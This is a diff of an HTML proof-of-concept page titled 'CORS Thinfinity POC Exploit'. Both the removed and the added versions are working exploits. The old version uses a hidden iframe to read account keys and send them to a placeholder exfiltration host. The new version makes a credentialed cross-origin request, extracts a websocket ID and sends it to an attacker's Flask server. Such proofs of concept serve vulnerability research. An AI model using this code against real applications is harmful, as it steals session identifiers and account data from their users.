@@ -1,18 +1,61 @@
+<!DOCTYPE html>
 <html>
-    <body>
-        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
-        <script>
-            var req = new XMLHttpRequest();
-            var url = 'APPLICATION URL'
-            req.onload = retrieveKeys;
+<body>
+<center>
+<h2>CORS Thinfinity POC Exploit</h2>
+<h3>Extract ID</h3>
 
-            req.open('GET', url + '/accountDetails', true);
-            req.withCredentials = true;
-            req.send(null);
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
 
-           function retrieveKeys() {
-               fetch('https://Exolit_Server_Hostname/log?key=' + req.responseText)
-            }
-        </script>"></iframe>
-    </body>
+<script>
+function cors() {
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+
+        response = JSON.parse(this.responseText)
+        id_str = response['id']
+
+        id_str = id_str.slice(1, id_str.length - 1)
+
+        alert("Exfiltrated ID: " + id_str)
+        alert("Do you want to send the exploit?")
+
+        const flask_http = new XMLHttpRequest();
+
+        // Server to exfiltrate the websocket id
+
+        // CHANGE THIS
+        var exf_server = "127.0.0.1:5000"
+        const url = "http://" + exf_server + "/cors?id=" + id_str
+
+
+        // Send ID to flask application
+        flask_http.open("GET", url)
+        flask_http.send()
+
+        flask_http.onreadystatechange = function() {
+                alert('Done!!!')
+        }
+
+    }
+};
+
+// exfiltrate ID using CORS vulnerability
+
+// CHANGE THIS
+
+var server = "172.16.28.140:8081"
+xhttp.open("GET", "https://" + server + "", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+
+
+</script>
+
+</body>
 </html>
